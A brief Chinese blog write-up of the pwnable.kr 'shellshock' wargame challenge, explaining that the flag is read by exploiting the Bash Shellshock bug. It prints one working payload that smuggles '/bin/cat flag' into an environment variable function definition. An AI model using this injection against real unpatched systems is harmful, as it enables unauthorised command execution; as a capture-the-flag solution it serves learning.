---
title: shellshock
author: rk700
layout: post
categories:
  - writeup
tags:
  - linux
  - pwnable.kr
---
好吧，从这名字就知道是怎么回事儿了，前端时间爆出来的shellshock漏洞。我们需要执行`cat flag`就行。不过我开始试`cat`会说找不到文件，于是用`/bin/cat`了

<pre>$ env x='() { :;}; /bin/cat flag' ./shellshock</pre>
